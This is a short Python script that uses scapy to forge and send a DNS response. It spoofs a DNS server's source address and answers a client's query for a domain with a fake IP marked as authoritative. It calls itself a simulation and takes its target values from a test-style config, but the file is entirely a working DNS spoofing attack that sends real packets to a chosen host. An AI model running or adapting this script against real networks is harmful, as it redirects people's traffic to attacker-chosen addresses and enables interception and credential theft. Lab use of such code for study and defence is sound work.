from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send

def send_fake_dns_response(config):
    """Send simulated poisoned DNS response using config values"""
    # Get values from config with fallbacks
    spoofed_server = config.get('dns_server') or "192.168.1.1"
    target_client = config.get('target_client') or "192.168.1.5"
    domain = config.get('test_domain') or "example.com"
    fake_ip = config.get('test_fake_ip') or "6.6.6.6"

    packet = IP(src=spoofed_server, dst=target_client)/ \
             UDP(sport=53, dport=33333)/ \
             DNS(id=0xAAAA, qr=1, aa=1, 
                 qd=DNSQR(qname=domain), 
                 an=DNSRR(rrname=domain, rdata=fake_ip))

    send(packet, verbose=0)
    print(f"[✓] Sent fake DNS response for {domain} from {spoofed_server} to {target_client}")
